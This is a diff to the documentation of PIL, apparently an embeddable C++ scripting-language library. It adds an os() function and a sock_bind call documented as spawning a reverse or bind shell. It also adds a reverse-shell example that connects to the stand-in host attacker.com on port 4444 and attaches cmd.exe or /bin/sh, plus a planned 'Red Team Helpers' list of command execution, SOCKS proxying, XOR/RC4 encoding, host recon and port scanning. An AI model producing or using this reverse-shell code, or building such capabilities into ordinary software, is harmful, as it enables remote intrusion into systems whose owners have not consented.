@@ -528,6 +528,7 @@ PIL::OpenStdLib(L);
 | `int(n)` | Truncate to integer (toward zero) | `int(-3.7)` | `-3` |
 | `push(arr, v)` | Add element to array | `push(arr, 4)` | - |
 | `pop(arr)` | Remove last element | `pop(arr)` | Last element |
+| `os()` | Get OS type | `os()` | `"win"`, `"linux"`, or `"uefi"` |
 
 ---
 
@@ -605,6 +606,7 @@ PIL::OpenNetworkIO(L, &netCtx);
 | `sock_close(handle)` | Close socket, returns true/false |
 | `sock_send(handle, data)` | Send data, returns bytes sent or -1 |
 | `sock_recv(handle [, size])` | Receive data (max 255 bytes), returns string |
+| `sock_bind(handle, cmd)` | Bind socket to process stdin/stdout (reverse/bind shell), returns PID or -1 |
 
 Maximum 8 sockets simultaneously.
 
@@ -617,6 +619,35 @@ if (sock >= 0) {
     var response = sock_recv(sock, 255);
     print(response);
     sock_close(sock);
+}
+```
+
+#### Reverse Shell Example
+
+```javascript
+// Cross-platform reverse shell using os() for shell detection
+var sock = sock_connect("attacker.com", 4444);
+if (sock >= 0) {
+    var shell = "";
+    var platform = os();
+
+    if (platform == "win") {
+        shell = "cmd.exe";       // Windows Command Prompt
+        // shell = "powershell.exe";  // Alternative: PowerShell
+    } else if (platform == "linux") {
+        shell = "/bin/sh";       // POSIX shell
+        // shell = "/bin/bash";  // Alternative: Bash
+    }
+
+    if (len(shell) > 0) {
+        var pid = sock_bind(sock, shell);
+        if (pid >= 0) {
+            print("Shell spawned with PID:", pid);
+        }
+    } else {
+        print("Unsupported platform:", platform);
+        sock_close(sock);
+    }
 }
 ```
 
@@ -745,7 +776,7 @@ if (ws >= 0) {
 ### Basic Usage
 
 ```cpp
-#include "pil/pil.h"
+#include "pil.h"
 
 PIL::State* L = new PIL::State();
 
@@ -1013,17 +1044,69 @@ if (ws >= 0) {
 
 ---
 
+## TODO: Red Team Helpers
+
+The following functions are planned for future implementation:
+
+### Process Binding & Execution
+
+| Function | Description |
+|----------|-------------|
+| `ws_bind(ws, cmd)` | Bind WebSocket to process stdin/stdout |
+| `exec(cmd)` | Execute command, return output |
+| `spawn(cmd)` | Spawn async process, return handle |
+| `pipe_read(handle)` / `pipe_write(handle, data)` | I/O with spawned process |
+
+### SOCKS Proxy
+
+| Function | Description |
+|----------|-------------|
+| `socks_server(port)` | Start SOCKS4/5 proxy server |
+| `socks_connect(proxy, pport, target, tport)` | Connect through SOCKS proxy |
+
+### Data Encoding/Crypto
+
+| Function | Description |
+|----------|-------------|
+| `base64_encode(data)` / `base64_decode(data)` | Base64 encoding |
+| `hex_encode(data)` / `hex_decode(data)` | Hex encoding |
+| `xor(data, key)` | XOR cipher |
+| `rc4(data, key)` | RC4 stream cipher |
+| `aes_encrypt(data, key, iv)` / `aes_decrypt(data, key, iv)` | AES encryption |
+| `md5(data)` / `sha256(data)` | Hashing |
+
+### System Recon
+
+| Function | Description |
+|----------|-------------|
+| `env(name)` | Get environment variable |
+| `hostname()` | Get system hostname |
+| `whoami()` | Current username |
+| `pid()` | Current process ID |
+| `arch()` | Architecture (x86/x64/arm/arm64) |
+
+### Port Scanning
+
+| Function | Description |
+|----------|-------------|
+| `port_open(host, port)` | Check if port is open |
+| `port_scan(host, start, end)` | Scan port range, return open ports array |
+| `service_banner(host, port)` | Grab service banner |
+
+---
+
 ## Architecture
 
-PIL is implemented as a standalone module:
+PIL is implemented as a header-only library:
 
 ```
-include/pil/
+include/
 ├── token.h          # Token types and struct
 ├── lexer.h          # Lexer class
 ├── ast.h            # AST node definitions + allocator
 ├── parser.h         # Recursive descent parser
 ├── value.h          # Value type system + Environment
+├── pool.h           # Fixed-size array pool allocator
 ├── interpreter.h    # Tree-walking interpreter
 ├── stdlib.h         # Standard library functions
 ├── fileio.h         # File I/O functions
